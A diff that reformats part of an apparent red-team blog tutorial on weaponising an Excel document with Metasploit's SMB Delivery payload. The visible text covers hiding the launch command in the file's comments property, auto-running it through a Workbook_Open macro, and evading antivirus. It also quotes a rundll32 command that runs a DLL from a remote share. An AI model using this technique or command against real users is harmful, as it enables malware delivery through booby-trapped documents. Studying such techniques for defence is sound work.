@@ -22,11 +22,7 @@ There are numerous ways on how MS Office documents can be abused and weaponised 
 
 
 
-**Metasploit:**
-
-
-
-In the first example I’m going to use a payload generated with Metasploits ‘SMB Delivery’ functionality to Weaponise a MS Excel document. The ‘SMB Delivery’ is a personal favourite of mine given its simplicity and subtle anti-virus evasion.
+**Metasploit:** In the first example I’m going to use a payload generated with Metasploits ‘SMB Delivery’ functionality to Weaponise a MS Excel document. The ‘SMB Delivery’ is a personal favourite of mine given its simplicity and subtle anti-virus evasion.
 
 
 
@@ -109,11 +105,7 @@ rundll32.exe \\192.168.0.11\PPuUdw\test.dll,0
 
 
 
-**Note: the folder path is randomly generated as we didn’t explicitly define it within the Metasploit options**
-
-
-
-In order to achieve this, we’re going to embed this command into a MS Excel document within the ‘comments’ property and execute it from an embedded Macro. This can easily be done by using the Powershell script: ‘Commentator’ ([https://github.com/clr2of8/Commentator](https://github.com/clr2of8/Commentator))
+**Note: the folder path is randomly generated as we didn’t explicitly define it within the Metasploit options** In order to achieve this, we’re going to embed this command into a MS Excel document within the ‘comments’ property and execute it from an embedded Macro. This can easily be done by using the Powershell script: ‘Commentator’ ([https://github.com/clr2of8/Commentator](https://github.com/clr2of8/Commentator))
 
 
 
@@ -241,11 +233,7 @@ End Sub
 
 
 
-**Note: In order to utilise auto-execution via the ‘*Workbook_Open()*’ function, the weaponised MS Excel document needed to be downgraded to Office 98 – 2003 compatibility (.xls)**
-
-
-
-[![](/wp-content/uploads/2017/12/ks-msf5.jpg)](/wp-content/uploads/2017/12/ks-msf5.jpg)
+**Note: In order to utilise auto-execution via the ‘*Workbook_Open()*’ function, the weaponised MS Excel document needed to be downgraded to Office 98 – 2003 compatibility (.xls)** [![](/wp-content/uploads/2017/12/ks-msf5.jpg)](/wp-content/uploads/2017/12/ks-msf5.jpg)
 
 
 
